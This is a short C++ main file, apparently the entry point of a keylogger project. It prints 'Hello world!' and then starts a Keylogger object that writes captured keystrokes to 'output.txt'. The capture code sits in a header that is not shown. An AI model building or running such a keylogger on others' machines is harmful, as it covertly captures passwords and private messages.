#include <iostream>

#include "Keylogger/Keylogger.hpp"

int main(void)
{
    std::string output {"output.txt"};
    std::cout << "Hello world!" << std::endl;
    Keylogger logger {output};
    return 0;
}
